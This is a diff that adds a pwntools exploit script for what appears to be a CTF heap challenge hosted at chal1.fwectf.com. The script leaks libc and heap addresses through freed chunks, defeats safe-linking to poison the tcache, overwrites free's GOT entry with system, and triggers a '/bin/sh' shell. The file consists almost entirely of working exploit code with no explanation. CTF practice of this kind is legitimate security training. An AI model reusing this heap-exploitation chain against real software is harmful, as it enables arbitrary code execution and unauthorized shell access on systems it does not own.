@@ -1,0 +1,80 @@
+from pwn import *
+
+context.log_level = "debug"
+context.arch = "amd64"
+context.os = "linux"
+context.terminal = ["/usr/bin/tmux", "sp", "-h"]
+
+f_remote = True if "remote" in sys.argv else False
+f_gdb = True if "gdb" in sys.argv else False
+
+vuln_path = "./chall.patch"
+elf = ELF(vuln_path)
+libc = elf.libc
+
+io = process([vuln_path]) if not f_remote else remote("chal1.fwectf.com", 8010)
+
+
+def ddebug(b=""):
+    if not f_gdb: return
+    gdb.attach(io, gdbscript=b)
+    pause()
+
+
+def create(idx, size, data):
+    io.sendlineafter("> ", "1")
+    io.sendlineafter("Index: ", str(idx))
+    io.sendlineafter("Size: ", str(size))
+    io.sendlineafter("Data: ", data)
+
+
+def delete(idx):
+    io.sendlineafter("> ", "2")
+    io.sendlineafter("Index: ", str(idx))
+
+
+def edit(idx, data):
+    io.sendlineafter("> ", "3")
+    io.sendlineafter("Index: ", str(idx))
+    io.sendlineafter("Data: ", data)
+
+
+def show(idx):
+    io.sendlineafter("> ", "4")
+    io.sendlineafter("Index: ", str(idx))
+
+
+p_chunk = 0x04040A0
+
+create(0, 0x520, "aa")
+create(1, 0x10, "a")
+create(2, 0x70, "a")
+create(3, 0x70, "a")
+create(4, 0x70, "a")
+delete(0)
+show(0)
+leak = u64(io.recv(8))
+libc.address = leak - 0x203b20
+log.success("libc :-----> " + hex(libc.address))
+delete(2)
+delete(3)
+show(3)
+leak = u64(io.recv(8))
+log.success(hex(leak))
+heap = (leak ^ leak >> 12) & 0xfffff000
+log.success("heap :-----> " + hex(heap))
+
+free_got = elf.got["free"]
+target = free_got
+edit(3, p64((heap + 0x870) >> 12 ^ target))
+ddebug("b *0x000040142f\n continue")
+create(5, 0x70, "/bin/sh")
+
+system = libc.symbols["system"]
+puts = libc.symbols["puts"]
+free = libc.symbols["free"]
+create(6, 0x70, p64(system) + p64(puts))
+
+delete(5)
+
+io.interactive()
